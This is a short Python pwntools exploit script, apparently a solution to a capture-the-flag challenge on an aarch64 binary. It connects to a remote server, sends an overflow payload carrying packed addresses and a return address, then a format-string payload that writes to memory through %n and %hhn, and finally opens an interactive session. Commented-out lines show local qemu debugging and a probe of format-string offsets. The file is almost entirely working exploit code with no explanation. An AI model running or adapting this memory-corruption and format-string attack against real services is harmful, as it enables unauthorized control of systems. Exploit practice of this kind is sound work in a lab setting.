from pwn import *
p = remote("155.248.203.119",42051)
#p = process(['qemu-aarch64','-g','1235','-L','/usr/aarch64-linux-gnu', 'chal'])
#p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', 'chal'])
pwd = 0x0000000000411058
p.recv()
payload1 = b'A'*8 + p64(pwd+2) + p64(pwd+1) + p64(pwd) + p64(pwd+3) + p64(pwd+7) + b'B'*(72-48) +p64(0x4007EC)
p.sendline(payload1)
p.recv()
# for i in range(0,100):
#     log.info("Position: %d",i)
#     p.sendline(str('%{}$p'.format(i)).encode())
#     print(p.recv().decode())
#time.sleep(1)
payload2 = str('%14$n%15$n%3c%{}$hhn%16c%{}$hhn%36c%{}$hhn'.format(11,12,13)).encode() 
p.sendline(payload2)
p.interactive()
